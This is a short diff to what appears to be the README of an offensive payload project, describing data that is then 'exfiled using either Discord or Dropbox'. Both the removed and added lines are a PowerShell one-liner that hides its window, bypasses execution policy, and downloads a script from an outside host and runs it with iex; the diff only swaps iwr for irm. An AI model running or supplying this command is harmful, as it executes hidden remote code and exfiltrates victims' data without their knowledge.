@@ -40,7 +40,7 @@ They are then exfiled using either Discord or Dropbox.
 SYNTAX:
 
 ```
-powershell -w h -ep bypass $dc='';$db='';iwr https://jakoby.lol/hgw | iex
+powershell -w h -ep bypass $dc='';$db='';irm https://jakoby.lol/hgw | iex
 ```
 
 <!-- CONTACT -->
